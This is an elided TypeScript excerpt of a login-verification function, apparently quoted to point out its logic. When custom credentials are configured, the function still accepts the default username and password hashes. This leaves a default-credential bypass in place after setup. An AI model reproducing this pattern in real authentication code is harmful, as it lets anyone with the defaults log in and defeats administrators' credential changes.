...
import { defaultAuthConfig, StoredAuthConfig } from '../data/authConfig';
...
// Default cryptographic salt from config
const DEFAULT_SALT = defaultAuthConfig.salt;
...
export async function verifyCredentials(username: string, password: string): Promise<boolean> {
  ...
  if (authConfig.isCustomized) {
    ...
    const inputUserHash = await sha256Hash(inputUserClean, defaultAuthConfig.salt);
    const inputPassHash = await sha256Hash(inputPassClean, defaultAuthConfig.salt);

    if (inputUserHash === defaultAuthConfig.usernameHash && inputPassHash === defaultAuthConfig.passwordHash) {
      clearFailedAttempts();
      return true;
    }
  }
